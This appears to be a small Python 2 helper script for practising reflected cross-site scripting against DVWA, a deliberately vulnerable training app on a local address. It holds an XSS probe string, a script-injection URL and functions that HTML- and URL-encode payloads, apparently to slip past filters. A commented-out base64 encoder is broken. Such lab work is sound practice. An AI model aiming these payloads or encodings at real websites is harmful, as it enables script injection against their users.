import base64
import HTMLParser
token = "1367"
PLOAD2 = """'';!--"<b>b</b><iframe src="http://www.w3schools.com"></iframe><"""+ token +""">=&{()}"""

class encoders:
    def html_encode(self,prse):
        '''
        Swaps characters in string
        '''
        html_chars = (
            ("'",'&#39;'),
            ('"','&quot'),
            (">",'&gt;'),
            ("<",'&lt;'),
            ("&","&#38;"),
            ("(",'&#40;'),
            (")",'&#41;')

        )
        for chars in html_chars:
            prse = prse.replace(chars[0],chars[1])
        return prse

    def url_encode(self,prse):
        '''
        Swaps characters in string
        '''
        url_chars = (
            ("'",'%27'),
            #lower double quote code
            ('"','%22'),
            (">",'%3E'),
            ("<",'%3C'),
            ("&","%26"),
            ("(",'%28'),
            (")",'%29'),
            ('/','%2F')

        )
        for chars in url_chars:
            prse = prse.replace(chars[0],chars[1])
        return prse

    # def b64_encode(self,prse):
    #     '''
    #     Swaps characters in string
    #     '''
    #     b64_chars = (
    #         ("'",'%27'),
    #         ('"','%93'),
    #         (">",'Pg=='),
    #         ("<",'PA=='),
    #         ("&","%26"),
    #         ("(",'%28'),
    #         (")",'%29')
    #
    #     )
    #     for chars in url_chars:
    #         prse = prse.replace(chars[0],chars[1])
    #     return prse

enc = encoders()
#PLOAD2 = enc.url_encode(PLOAD2)
print enc.url_encode("<>('')</>")

print "b64 " + base64.b64encode('<>')

PLD_URL1 = '''http://192.168.127.178/dvwa/vulnerabilities/xss_r/?name="><script>alert("test")</script>'''

split_start = PLD_URL1.split("?", 1)[0]
split_end = PLD_URL1.split("?", 1)[1]

### ---- Reconect string ---- ###
split_end = enc.url_encode(split_end)
# enc_ploadURL = split_start + "?" +enc.html_encode(split_end)
enc_ploadURL = split_start + "?" + split_end

html_parser = HTMLParser.HTMLParser()
unescaped = html_parser.unescape(PLD_URL1)
print unescaped

# fudgepacker = url_encode(PLOAD2)
# fudge = html_encode(PLOAD2)
# print PLOAD2 + "\n"
# print fudge + "\n"
# print fudgepacker + "\n"


